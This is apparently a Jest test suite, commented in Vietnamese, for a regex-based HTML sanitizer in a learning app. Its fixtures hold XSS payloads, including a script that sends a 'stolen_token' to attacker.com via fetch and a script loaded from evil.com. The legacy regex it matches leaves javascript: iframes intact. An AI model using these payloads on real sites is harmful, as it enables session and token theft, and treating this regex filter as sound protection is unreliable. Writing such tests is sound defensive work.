/**
 * Unit & Characterization Tests for sanitizeHtml module (js/core/sanitize-html.js)
 * 
 * Đảm bảo 100% contract và tương thích ngược:
 * - Loại bỏ thẻ <script>
 * - Loại bỏ inline event handlers (onerror, onclick, onload...)
 * - Loại bỏ javascript: URLs
 * - Bảo toàn HTML hợp lệ (div, span, b, i, img, table...)
 * - Bảo toàn KaTeX & Math elements
 * - Bảo toàn CSS inline hợp lệ
 * - Chuỗi rỗng & non-string inputs
 * - 100% Characterization đối chiếu với legacy implementation
 */

const sanitizeHtml = require('../../js/core/sanitize-html');
const { sanitizeHtml: destructuredFn } = require('../../js/core/sanitize-html');

// Bản cài đặt tham chiếu nguyên bản để đối chiếu Characterization
function legacySanitizeHtml(html) {
    if (typeof html !== 'string') return html;
    return html
        .replace(/<script[^>]*>([\s\S]*?)<\/script>/gi, '')
        .replace(/\son[a-z]+\s*=\s*(['"][^'"]*['"]|[^\s>]+)/gi, '')
        .replace(/href\s*=\s*['"]\s*javascript:[^'"]*['"]/gi, '');
}

describe("Unit Tests — sanitizeHtml (js/core/sanitize-html.js)", () => {

    describe("1. Public Contract & Exports", () => {
        test("Export hàm trực tiếp qua module.exports", () => {
            expect(typeof sanitizeHtml).toBe('function');
        });

        test("Export hàm qua destructuring { sanitizeHtml }", () => {
            expect(typeof destructuredFn).toBe('function');
            expect(destructuredFn).toBe(sanitizeHtml);
        });

        test("Tự động gán vào globalThis / window", () => {
            expect(globalThis.sanitizeHtml).toBeDefined();
            expect(typeof globalThis.sanitizeHtml).toBe('function');
        });
    });

    describe("2. Xử lý Thẻ <script> (Script Tags Stripping)", () => {
        test("Bóc tách thẻ script đơn giản", () => {
            const input = "<div>Chào mừng <script>alert('XSS')</script> học sinh!</div>";
            const expected = "<div>Chào mừng  học sinh!</div>";
            expect(sanitizeHtml(input)).toBe(expected);
        });

        test("Bóc tách thẻ script nhiều dòng", () => {
            const input = `<div>
                <script type="text/javascript">
                    const secret = "stolen_token";
                    fetch("http://attacker.com?t=" + secret);
                </script>
                <span>Nội dung an toàn</span>
            </div>`;
            const expected = `<div>
                
                <span>Nội dung an toàn</span>
            </div>`;
            expect(sanitizeHtml(input)).toBe(expected);
        });

        test("Bóc tách nhiều thẻ script độc lập", () => {
            const input = "<script>var a=1;</script><p>Đoạn văn</p><script>var b=2;</script>";
            const expected = "<p>Đoạn văn</p>";
            expect(sanitizeHtml(input)).toBe(expected);
        });

        test("Bóc tách thẻ script không phân biệt hoa thường (SCRIPT, Script)", () => {
            const input = "<SCRIPT SRC='http://evil.com/payload.js'></SCRIPT><p>Toán học</p>";
            const expected = "<p>Toán học</p>";
            expect(sanitizeHtml(input)).toBe(expected);
        });
    });

    describe("3. Xử lý Thuộc tính Bắt sự kiện Inline (Inline Event Handlers)", () => {
        test("Loại bỏ onerror trên thẻ img", () => {
            const input = '<img src="invalid.jpg" onerror="alert(1)" alt="Ảnh minh họa">';
            const expected = '<img src="invalid.jpg" alt="Ảnh minh họa">';
            expect(sanitizeHtml(input)).toBe(expected);
        });

        test("Loại bỏ onclick trên thẻ button hoặc div", () => {
            const input = '<button onclick="evilFunction()">Bấm vào đây</button>';
            const expected = '<button>Bấm vào đây</button>';
            expect(sanitizeHtml(input)).toBe(expected);
        });

        test("Loại bỏ onload, onmouseover, onfocus", () => {
            const input = '<body onload="attack()" onmouseover=\'hoverAttack()\' onfocus=focusAttack()>';
            const expected = '<body>';
            expect(sanitizeHtml(input)).toBe(expected);
        });

        test("Loại bỏ sự kiện viết hoa: ONCLICK, OnError", () => {
            const input = '<div ONCLICK="alert(1)" OnMouseOver="alert(2)">Nội dung</div>';
            const expected = '<div>Nội dung</div>';
            expect(sanitizeHtml(input)).toBe(expected);
        });
    });

    describe("4. Xử lý Liên kết Nguy hiểm (javascript: URLs)", () => {
        test("Loại bỏ href='javascript:...'", () => {
            const input = '<a href="javascript:alert(document.cookie)">Xem chi tiết</a>';
            const expected = '<a >Xem chi tiết</a>';
            expect(sanitizeHtml(input)).toBe(expected);
        });

        test("Loại bỏ href với khoảng trắng bên trong javascript:", () => {
            const input = '<a href=\'  javascript: doSomething()  \'>Bấm đây</a>';
            const expected = '<a >Bấm đây</a>';
            expect(sanitizeHtml(input)).toBe(expected);
        });

        test("Loại bỏ href=JAVASCRIPT: viết hoa", () => {
            const input = '<a href="JAVASCRIPT:alert(1)">Liên kết</a>';
            const expected = '<a >Liên kết</a>';
            expect(sanitizeHtml(input)).toBe(expected);
        });
    });

    describe("5. Bảo toàn HTML Hợp lệ & Định dạng An toàn", () => {
        test("Bảo toàn các thẻ định dạng thông dụng: div, span, b, i, p, br, hr", () => {
            const input = '<div class="lesson-content"><b>Bài 1:</b> Tập hợp <i>các số tự nhiên</i>.<br><p>Nội dung chi tiết...</p></div>';
            expect(sanitizeHtml(input)).toBe(input);
        });

        test("Bảo toàn liên kết an toàn: http, https, mailto, relative paths", () => {
            const input = '<a href="https://moet.gov.vn" target="_blank">Bộ Giáo Dục</a> <a href="/api/download">Tải đề thi</a>';
            expect(sanitizeHtml(input)).toBe(input);
        });

        test("Bảo toàn ảnh an toàn với đường dẫn hợp lệ", () => {
            const input = '<img src="assets/images/geometry.svg" alt="Hình học trực quan" width="200" height="150">';
            expect(sanitizeHtml(input)).toBe(input);
        });

        test("Bảo toàn bảng dữ liệu HTML (table, tr, th, td)", () => {
            const input = '<table><thead><tr><th>STT</th><th>Học sinh</th></tr></thead><tbody><tr><td>1</td><td>Trần Bình Minh</td></tr></tbody></table>';
            expect(sanitizeHtml(input)).toBe(input);
        });
    });

    describe("6. Bảo toàn Biểu thức KaTeX & Toán học", () => {
        test("Bảo toàn công thức KaTeX HTML có cấu trúc phức tạp", () => {
            const katexHtml = '<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>x</mi><mo>+</mo><mn>5</mn><mo>=</mo><mn>10</mn></mrow></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.6667em;vertical-align:-0.0833em;"></span><span class="mord mathnormal">x</span><span class="mbin">+</span><span class="mord">5</span><span class="mspace" style="margin-right:0.2778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2778em;"></span></span><span class="base"><span class="strut" style="height:0.6444em;"></span><span class="mord">10</span></span></span></span>';
            expect(sanitizeHtml(katexHtml)).toBe(katexHtml);
        });

        test("Bảo toàn khối toán hiển thị KaTeX Display", () => {
            const katexDisplay = '<div class="katex-display"><span class="katex"><span class="katex-html"><span class="base"><span class="mord mathnormal">A</span><span class="mspace"></span><span class="mrel">=</span><span class="mspace"></span><span class="mord">123</span></span></span></span></div>';
            expect(sanitizeHtml(katexDisplay)).toBe(katexDisplay);
        });
    });

    describe("7. Bảo toàn Thuộc tính CSS Inline An toàn", () => {
        test("Bảo toàn style hiển thị màu sắc, font chữ và căn chỉnh", () => {
            const input = '<div style="margin-bottom:0.4rem; color:var(--success); font-weight:700; font-size: 1rem;">Đáp án đúng: 42</div>';
            expect(sanitizeHtml(input)).toBe(input);
        });

        test("Bảo toàn style phức tạp của Review Item trong HocTap", () => {
            const input = '<div class="review-item" style="font-family: var(--font-family) !important; border-left: 5px solid var(--success); padding: 1.2rem; background-color: var(--bg-card);"><span style="color: #3b82f6;">Câu hỏi 1 (Cơ bản)</span></div>';
            expect(sanitizeHtml(input)).toBe(input);
        });
    });

    describe("8. Chuỗi rỗng & Đầu vào Không phải Chuỗi (Non-string Inputs)", () => {
        test("Chuỗi rỗng trả về chuỗi rỗng", () => {
            expect(sanitizeHtml("")).toBe("");
        });

        test("null trả về nguyên bản (theo contract cũ)", () => {
            expect(sanitizeHtml(null)).toBeNull();
        });

        test("undefined trả về nguyên bản (theo contract cũ)", () => {
            expect(sanitizeHtml(undefined)).toBeUndefined();
        });

        test("number trả về nguyên bản (theo contract cũ)", () => {
            expect(sanitizeHtml(12345)).toBe(12345);
            expect(sanitizeHtml(0)).toBe(0);
        });

        test("boolean trả về nguyên bản (theo contract cũ)", () => {
            expect(sanitizeHtml(true)).toBe(true);
            expect(sanitizeHtml(false)).toBe(false);
        });

        test("object và array trả về nguyên bản (theo contract cũ)", () => {
            const obj = { text: "hello" };
            const arr = [1, 2, 3];
            expect(sanitizeHtml(obj)).toBe(obj);
            expect(sanitizeHtml(arr)).toBe(arr);
        });
    });

    describe("9. Domain Use Cases thực tế trong HocTap", () => {
        test("Làm sạch câu trả lời ngắn của học sinh", () => {
            const studentInput = "Đáp án là 100 <script>alert('hack')</script>";
            const clean = sanitizeHtml(studentInput);
            expect(clean).toBe("Đáp án là 100 ");
        });

        test("Làm sạch đề bài trắc nghiệm có chứa thẻ b, i, KaTeX", () => {
            const questionText = "Cho tập hợp $A = \\{1; 2; 3\\}$. Khẳng định nào sau đây là <b>đúng</b>?";
            expect(sanitizeHtml(questionText)).toBe(questionText);
        });

        test("Làm sạch danh sách phương án A, B, C, D", () => {
            const option = '<div style="margin-bottom:0.4rem; color:var(--success); font-weight:700;">✔️ <b>A.</b> 42</div>';
            expect(sanitizeHtml(option)).toBe(option);
        });
    });

    describe("10. Characterization Test — Đối chiếu 100% với legacy implementation", () => {
        const testPayloads = [
            "Đoạn văn bản thuần túy không có HTML",
            "<p>Thẻ p thông thường</p>",
            "<div><script>alert(1)</script><span>Hello</span></div>",
            "<img src='x' onerror='alert(1)'>",
            "<a href='javascript:alert(1)'>Click me</a>",
            "<a href=\"javascript:evil()\">Link</a>",
            "<button onclick=\"doSomething()\">Button</button>",
            "<div style=\"color: red;\" onmouseover=\"alert(1)\">Hover me</div>",
            "<SCRIPT SRC=\"http://evil.com\"></SCRIPT>",
            "<script>\nvar x = 1;\nvar y = 2;\n</script>",
            "",
            "<span class=\"katex\"><span class=\"katex-html\">$x^2 + y^2 = z^2$</span></span>",
            "<b>Trần Bình Minh</b> — Điểm số: 10/10",
            "<a href='https://google.com' target='_blank'>Google</a>",
            "<input type='text' value='123' onfocus='alert(1)'>",
            "<iframe src='javascript:alert(1)'></iframe>",
            "Text with &lt;entities&gt; and &amp; ampersands",
            "Special chars: !@#$%^&*()_+=-~`{}[]|:;'<>,.?/"
        ];

        testPayloads.forEach((payload, idx) => {
            test(`Characterization payload #${idx + 1}: "${payload.substring(0, 30)}..."`, () => {
                expect(sanitizeHtml(payload)).toBe(legacySanitizeHtml(payload));
            });
        });
    });
});
